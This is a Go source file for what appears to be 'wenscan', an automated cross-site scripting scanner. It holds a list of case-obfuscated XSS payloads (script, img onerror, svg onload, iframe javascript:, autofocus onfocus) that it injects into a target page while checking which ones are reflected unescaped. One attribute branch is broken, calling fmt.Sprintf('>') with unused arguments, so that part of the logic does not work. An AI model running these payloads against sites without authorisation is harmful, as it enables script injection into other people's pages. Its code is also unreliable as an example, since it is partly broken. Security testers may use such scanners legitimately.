package main

import (
	"fmt"
	Helper "wenscan/Helper"
	httpex "wenscan/Http"
	log "wenscan/Log"
	"wenscan/Xss"

	"github.com/thoas/go-funk"
)

var (
	script_payload     string = "<ScRiPt>%s</sCrIpT>"
	JaVaScRiPt_payload string = "<ScRiPt>JaVaScRiPt:var %s</sCrIpT>"
	img_payload        string = "<iMg SrC=1 oNeRrOr=%s>"
	href_payload       string = "<a HrEf=JaVaScRiPt:%s>cLiCk</A>"
	svg_payload        string = "<sVg/OnLoAd=%s>"
	iframe_payload     string = "<IfRaMe SrC=jAvAsCrIpT:%s>"
	input_payload      string = "<input autofocus onfocus=%s>"
	style_payload      string = "expression(a(%s))"

	payload3_prompt string = "prompt(1)"
)
var payloads = []string{
	script_payload,
	JaVaScRiPt_payload,
	img_payload,
	href_payload,
	svg_payload,
	iframe_payload,
	input_payload,
	style_payload,
}

func main() {
	log.DebugEnable(false)
	playload := Xss.RandStringRunes(12)
	Spider := httpex.Spider{}
	Spider.Init()
	defer Spider.Close()
	html := Spider.Sendreq("", playload)
	locations := Helper.SearchInputInResponse(playload, *html)
	if len(locations) == 0 {
		log.Error("SearchInputInResponse error,U can convert html encode")
	}
	var result interface{}
	VulOK := false
	for _, tag := range payloads {
		result = funk.Map(locations, func(item Helper.Occurence) (bool, string) {
			var newpayload string
			if !VulOK {
				if item.Type == "html" && !VulOK {
					newpayload = fmt.Sprintf(tag, playload)
					html := Spider.Sendreq("", newpayload)
					locations := Helper.SearchInputInResponse(playload, *html)
					for _, location := range locations {
						if location.Details.Content == playload {
							log.Info("《html》html标签可被闭合 发现xss漏洞 payloads:%s", newpayload)
							VulOK = true
							break
						}
					}
				} else if item.Type == "attibute" {
					//假设如果渲染得值在key中
					if item.Details.Content == "key" {
						newpayload = fmt.Sprintf(">", tag, playload)
						html := Spider.Sendreq("", newpayload)
						locations := Helper.SearchInputInResponse(playload, *html)
						for _, location := range locations {
							if location.Details.Content == playload {
								log.Info("《attibute》Key html标签可被闭合 发现xss漏洞 payloads:%s", newpayload)
								VulOK = true
								break
							}
						}
					} else {
						//否则就在value中
						newpayload = fmt.Sprintf(tag, playload)
						html := Spider.Sendreq("", newpayload)
						//println(*html)
						locations := Helper.SearchInputInResponse(newpayload, *html)
						for _, location := range locations {
							ret := funk.Map(*location.Details.Attributes, func(item Helper.Attribute) bool {
								return newpayload == item.Val
							})
							if funk.Contains(ret, true) {
								log.Info("《attibute》Val html标签可被闭合 发现xss漏洞 payloads:%s", newpayload)
								VulOK = true
								break
							}
						}
					}

				}
			}

			return VulOK, newpayload
		})
	}

	if funk.Contains(result, true) {
		//log.Info("html标签可被闭合")
	}

}
